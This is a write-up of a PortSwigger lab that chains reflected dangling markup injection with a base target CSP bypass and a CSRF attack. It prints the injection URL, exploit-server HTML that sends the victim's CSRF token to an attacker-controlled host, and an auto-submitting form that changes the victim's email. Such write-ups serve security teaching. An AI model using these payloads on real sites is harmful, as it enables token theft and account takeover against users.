# Reflected XSS protected by very strict CSP, with dangling markup attack

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack), you'll learn: Reflected XSS protected by very strict CSP, with dangling markup attack! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Background

This lab using a strict [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) that blocks outgoing requests to external web sites.

To solve the lab, first perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses the CSP and exfiltrates a simulated victim user's [CSRF token](https://portswigger.net/web-security/csrf/tokens) using Burp Collaborator. You then need to change the simulated user's email address to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

```html
<a href="">Click me</a>
```

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102000152.png)

Login as user `wiener`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102000208.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102000217.png)

In here, we can update our email.

Let's try to update it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102000239.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102000302.png)

When we clicked the `Update email` button, it'll send a POST request to `/my-account/change-email` with parameter `email` and `csrf`.

**We also see CSP (Content Security Policy) is enabled:**
```
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
```

However, we can see `object-src` `base-uri` is set to `none`.

**Now, we can try to provide a GET parameter `email` in the URL:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102004121.png)

As you can see, our input is reflected to the `<input>` tag's value.

**In here, we can try to inject some JavaScript code via dangling markup injection:**
```html
my-account?email="><img src=errorpls onerror=alert(document.domain) x="
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102004833.png)

However, the CSP blocked the `alert()` JavaScript function, as the `script-src` is set to `self`.

**Now, since CSP's `base-uri` is set to `none`, we can leverage the `<base>` tag to exfiltrate the CSRF token.**

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection#bypassing-csp-with-user-interaction), we can do that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102005823.png)

Let's use the exploit server:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102005019.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102005030.png)

**Payload:**
```html
my-account?email="><a href="https://exploit-0a89002e0459822cc1ae162701c40031.exploit-server.net/exploit">Click me to update email</a><base target='
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102005534.png)

When we click the link, **it'll redirect to our exploit server's exploit payload, with the CSRF token.**

**Let's go to the exploit server do exfiltration:**
```html
<html>
    <head>
        <title>XSS-29</title>
    </head>
    <body>
        <script>
            if(window.name) {
                new Image().src='//exploit-0a89002e0459822cc1ae162701c40031.exploit-server.net/log?'+encodeURIComponent(window.name);
            } else {
                window.location.replace('https://0a81003404868282c10c179800fd00e3.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a89002e0459822cc1ae162701c40031.exploit-server.net/exploit%22%3EClick%20me%20to%20update%20email%3C/a%3E%3Cbase%20target=%27');
            }
        </script>
    </body>
</html>
```

**To test it, we can click "Store" and "View exploit":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102010757.png)

**When we clicked "View exploit", the exploit HTML code will redirect us to our XSS payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102010839.png)

**Then, if the we click on our payload, it'll send the CSRF token to exploit server's access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102010936.png)

**URL decoded:**
```html
">
                            <input required type="hidden" name="csrf" value="JqFRqnLcMIG8Qvt6KFvHjqJYV2uBj48t">
                            <button class=
```

**Now, let's click "Deliver exploit to victim" to capture his/her CSRF token:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102011049.png)

**Access log:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102011108.png)

**URL decoded:**
```html
">
                            <input required type="hidden" name="csrf" value="iT656UfZGanewC5gcF46iKOlOzZXorx2">
                            <button class=
```

Nice! **Victim's CSRF token: `iT656UfZGanewC5gcF46iKOlOzZXorx2`**

Armed with above information, **we can perform CSRF attack, which changes victim's email to our controlled email address.**

**Final CSRF attack payload:**
```html
<html>
    <head>
        <title>XSS-29</title>
    </head>
    <body>
        <!-- Construct a form that performs CSRF attack, which changes victim's email address to hacker@evil-user.net-->
        <form name="csrfform" method="post" action="https://0a81003404868282c10c179800fd00e3.web-security-academy.net/my-account/change-email">
            <input type="hidden" id="csrf" name="csrf" value="" />
            <input type="hidden" name="email" value="hacker@evil-user.net" />
        </form>

        <script>
            // If the window.name object exist, then: (This is included in the <base> element in our XSS payload.)
            if(window.name) {
                // Extract victim's CSRF token in window's object name, at string length 80 - 112
                var CSRFToken = window.name.slice(80,112);

                // Update our CSRF form's CSRF value to the victim ones
                document.getElementById('csrf').value = CSRFToken;

                // Automatically submit the form
                document.forms['csrfform'].submit();
            // If no window.name object, then:
            } else {
                // Redirect to our XSS via dangling markup injection payload
                window.location.replace('https://0a81003404868282c10c179800fd00e3.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a89002e0459822cc1ae162701c40031.exploit-server.net/exploit%22%3EClick%20me%20to%20update%20email%3C/a%3E%3Cbase%20target=%27');
            }
        </script>
    </body>
</html>
```

**Finally, we can deliver the exploit to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102014735.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-29/images/Pasted%20image%2020230102014747.png)

We did it!

# What we've learned:

1. Reflected XSS protected by very strict CSP, with dangling markup attack